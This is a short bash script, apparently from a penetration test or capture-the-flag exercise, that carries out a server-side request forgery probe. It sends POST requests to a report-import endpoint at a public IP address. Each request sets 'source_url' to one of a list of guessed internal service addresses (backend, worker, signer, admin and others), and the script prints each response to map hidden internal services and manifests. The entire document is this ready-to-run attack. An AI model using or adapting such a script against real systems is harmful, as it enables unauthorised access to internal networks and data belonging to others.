#!/bin/bash
BASE="http://13.209.81.83:3000/api/reports/import"
targets=(
  "http://backend:8000/internal/manifest"
  "http://backend:8000/v1/manifest"
  "http://backend:8000/billing/manifest"
  "http://backend:8000/reports/manifest"
  "http://backend:8000/_internal/manifest"
  "http://backend:8000/manifest.json"
  "http://backend:8000/stage2"
  "http://backend:8000/stage3"
  "http://backend:8000/api/internal/manifest"
  "http://backend:8000/tenants-of-record"
  "http://backend:8000/api/tenants/manifest"
  "http://backend:8000/billing/tenants/manifest"
  "http://import-worker:8000/manifest"
  "http://worker:8000/manifest"
  "http://signer:8000/manifest"
  "http://manifest:8000/manifest"
  "http://manifest-service:8000/manifest"
  "http://internal:8000/manifest"
  "http://admin:8000/manifest"
)
for t in "${targets[@]}"; do
  resp=$(curl -s -m 5 -X POST "$BASE" -H 'Content-Type: application/json' -d "{\"source_url\":\"$t\"}")
  echo "TARGET: $t"
  echo "  -> $resp"
done
